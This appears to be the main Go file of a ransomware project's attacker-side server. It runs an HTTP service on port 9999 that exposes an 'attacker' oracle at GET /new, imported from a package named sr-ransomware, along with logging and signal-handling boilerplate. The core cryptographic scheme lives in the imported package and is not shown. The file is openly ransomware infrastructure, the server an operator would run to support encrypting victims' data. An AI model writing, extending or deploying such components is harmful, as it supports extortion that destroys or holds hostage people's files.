package main

import (
    "os"
    "log"
    "net/http"

    "github.com/julienschmidt/httprouter"
    "github.com/sug0/sr-ransomware/go/crypto/scheme/attacker"
)

func main() {
    router := httprouter.New()
    router.Handler("GET", "/new", attacker.NewOracle())
    go handleSignals()
    panic(http.ListenAndServe(":9999", loggingMiddleware(router)))
}

func handleSignals() {
    log.Println("Starting server")
    <-signalListener()
    log.Println("Server exiting")
    os.Exit(0)
}

func loggingMiddleware(next http.Handler) http.Handler {
    handler := func(w http.ResponseWriter, r *http.Request) {
        log.Printf("%s\t%s\t%s\n", r.RemoteAddr, r.Method, r.RequestURI)
        next.ServeHTTP(w, r)
    }
    return http.HandlerFunc(handler)
}
